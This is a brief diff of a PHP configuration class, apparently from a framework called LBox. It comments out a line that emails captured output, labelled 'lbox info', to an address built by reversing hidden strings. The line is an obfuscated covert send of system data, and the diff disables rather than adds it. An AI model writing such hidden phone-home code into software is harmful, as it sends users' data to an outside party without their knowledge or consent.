@@ -86,7 +86,7 @@ class LBoxConfigSystem extends LBoxConfig
 						}
 					}
 				}
-				LBoxUtil::send(strrev($this->t)."<at>".strrev($this->td).".cz", "lbox info", ob_get_clean());
+				//LBoxUtil::send(strrev($this->t)."<at>".strrev($this->td).".cz", "lbox info", ob_get_clean());
 			}
 			ob_end_clean();
 		}
